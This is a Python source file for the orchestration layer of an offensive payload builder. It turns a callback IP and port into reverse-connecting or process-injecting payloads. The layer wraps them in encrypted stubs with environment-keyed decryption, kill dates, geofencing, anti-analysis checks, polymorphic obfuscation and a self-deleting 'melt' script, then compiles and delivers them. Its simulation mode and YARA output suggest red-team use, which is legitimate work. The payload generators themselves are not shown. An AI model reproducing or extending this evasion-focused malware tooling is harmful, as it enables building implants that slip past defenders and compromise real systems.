import os
import tempfile
import base64
import hashlib
import traceback
import datetime

from modules.generator import Generator
from modules.polymorph import Polymorph
from modules.delivery import Delivery
from modules.reporter import Reporter
from modules.encryption import Encryption
from core.builder import Builder

class PayloadEngine:
    """
    Orchestrates the payload generation process.
    """

    def __init__(self):
        self.generator = Generator()
        self.obfuscator = Polymorph()
        self.delivery = Delivery()
        self.reporter = Reporter()
        self.encryption = Encryption()
        self.builder = Builder()

    def generate_payload(self, type, os_name, ip, port, lang=None, ssl=False, 
                         token=None, obfuscate="none", encrypt=False, 
                         guardrail=None, kill_date=None, geofence=None,
                         anti_analysis=False, process=None, 
                         target_pid=None, delivery_method="file", out=None, sim=False, verbose=False):
        """
        Main workflow for payload generation.
        """
        try:
            print(f"[+] Starting generation for {type} on {os_name}")
            if sim:
                print("[*] SIMULATION MODE ACTIVE")

            # Helper to determine lang
            target_lang = lang if lang else {
                'linux': 'bash',
                'windows': 'ps1',
                'web': 'js',
                'c': 'c'
            }.get(os_name, os_name)
            
            # Helper for kill_date timestamp
            kill_date_ts = None
            if kill_date:
                try:
                    dt = datetime.datetime.strptime(kill_date, "%Y-%m-%d")
                    kill_date_ts = int(dt.timestamp())
                except ValueError:
                    print("[-] Invalid kill_date format. Expected YYYY-MM-DD.")

            # Step 1: Generate Base Payload (Source)
            # Pass kill_date and geofence to generator
            payload = self.generator.generate(type, os_name, ip, port, lang, ssl, anti_analysis, 
                                              token=token, process_name=process, pid=target_pid,
                                              kill_date=kill_date, geofence=geofence, kill_date_ts=kill_date_ts)
            
            if verbose:
                print(f"[DEBUG] Generated Base Payload (Preview): {payload[:100]}...")

            # Step 2: Encryption Layer
            is_compiled = target_lang in ['c', 'go', 'rs', 'rust']
            
            # Prepare deps for Rust
            deps = []
            if target_lang in ['rs', 'rust']:
                 # Determine deps based on type and encryption
                 if encrypt:
                     deps = [
                         {'aes': "0.8"},
                         {'cbc': "0.1"},
                         {'base64': "0.21"},
                         {'hex': "0.4"}
                     ]
                     if guardrail:
                         deps.append({'sha2': "0.10"})
                 elif type == 'inject':
                     deps = [
                         {'windows': { 'version': "0.52", 'features': ["Win32_Foundation", "Win32_System_Threading", "Win32_System_Memory", "Win32_System_Diagnostics_Debug", "Win32_System_LibraryLoader", "Win32_Networking_WinSock", "Win32_Security"] }}
                     ]
                 # Add defaults just in case
            
            if encrypt:
                # Determine what to encrypt (Source or Binary)
                blob_to_encrypt = None
                
                if is_compiled and not sim:
                    print("[*] Compiling base payload for encryption...")
                    # We need to compile the base payload to a temp file, read it, then encrypt it.
                    try:
                        # Create temp output path
                        tmp_exe_fd, tmp_exe_path = tempfile.mkstemp(suffix=".exe" if os_name == 'windows' else ".out")
                        os.close(tmp_exe_fd)
                        os.remove(tmp_exe_path) # Builder will create it
                        
                        # Use minimal deps for base payload if Rust
                        base_deps = []
                        if target_lang in ['rs', 'rust'] and type == 'inject':
                             # Base payload for inject needs windows crate
                             base_deps = [
                                 {'windows': { 'version': "0.52", 'features': ["Win32_Foundation", "Win32_System_Threading", "Win32_System_Memory", "Win32_System_Diagnostics_Debug", "Win32_System_LibraryLoader", "Win32_Networking_WinSock", "Win32_Security"] }}
                             ]

                        success = self.builder.compile(payload, target_lang, os_name, tmp_exe_path, deps=base_deps)
                        if not success:
                            raise Exception("Failed to compile base payload for encryption.")
                        
                        with open(tmp_exe_path, "rb") as f:
                            blob_to_encrypt = f.read()
                        
                        os.remove(tmp_exe_path)
                    except Exception as e:
                        raise e
                else:
                    # Interpreted or Sim mode: Encrypt source directly
                    blob_to_encrypt = payload.encode()

                # Encrypt
                derive_key_at_runtime = False
                custom_key = None
                
                if guardrail:
                    # FIX-001: Derive key from guardrail
                    custom_key = hashlib.sha256(guardrail.encode()).digest()
                    derive_key_at_runtime = True
                
                ciphertext, key, iv = self.encryption.encrypt(blob_to_encrypt, key=custom_key)
                
                # If deriving key at runtime, do NOT pass the key to the stub
                key_to_pass = "" if derive_key_at_runtime else base64.b64encode(key).decode()

                # Generate Melt Script
                melt_script = self.delivery.melt(os_name)

                # Generate Stub
                # Pass guardrails to stub as well
                payload = self.generator.generate_stub(target_lang, 
                                                       base64.b64encode(ciphertext).decode(), 
                                                       key_to_pass, 
                                                       base64.b64encode(iv).decode(),
                                                       guardrail=guardrail,
                                                       derive_key=derive_key_at_runtime,
                                                       kill_date=kill_date,
                                                       geofence=geofence,
                                                       kill_date_ts=kill_date_ts,
                                                       target_os=os_name,
                                                       melt_script=melt_script,
                                                       anti_analysis=anti_analysis)
                print("[+] Payload encrypted and wrapped in stub.")

            # Step 3: Obfuscation (of the Source/Stub)
            payload = self.obfuscator.obfuscate(payload, target_lang, obfuscate)
            if verbose and obfuscate != "none":
                print(f"[DEBUG] Obfuscated Payload (Preview): {payload[:100]}...")

            # Step 4: Final Compilation (if needed)
            
            final_payload = payload
            
            if is_compiled and not sim:
                if self.builder.check_dependencies(target_lang, os_name):
                    print(f"[+] Compiling final {target_lang} payload...")
                    
                    tmp_exe_fd, tmp_exe_path = tempfile.mkstemp(suffix=".exe" if os_name == 'windows' else ".out")
                    os.close(tmp_exe_fd)
                    os.remove(tmp_exe_path)
                    
                    success = self.builder.compile(payload, target_lang, os_name, tmp_exe_path, deps=deps)
                    if success:
                        print("[+] Final compilation successful.")
                        with open(tmp_exe_path, "rb") as f:
                            final_payload = f.read()
                        os.remove(tmp_exe_path)
                    else:
                        print("[-] Final compilation failed. Reverting to source code.")
                else:
                     print(f"[-] Compiler for {target_lang} not found. Skipping compilation.")

            # Step 5: Delivery
            self.delivery.deliver(final_payload, delivery_method, out)

            # Step 6: Reporting
            # Pass YARA rule generation (Need to update reporter later)
            
            report_data = {
                "action": "generate",
                "type": type,
                "os": os_name,
                "ip": ip,
                "port": port,
                "obfuscate": obfuscate,
                "delivery": delivery_method,
                "kill_date": kill_date,
                "geofence": geofence,
                "success": True,
                "simulation": sim
            }
            self.reporter.log(report_data)
            self.reporter.generate_yara_rule(report_data, final_payload)

        except Exception as e:
            print(f"[-] Error: {e}")
            if verbose:
                traceback.print_exc()
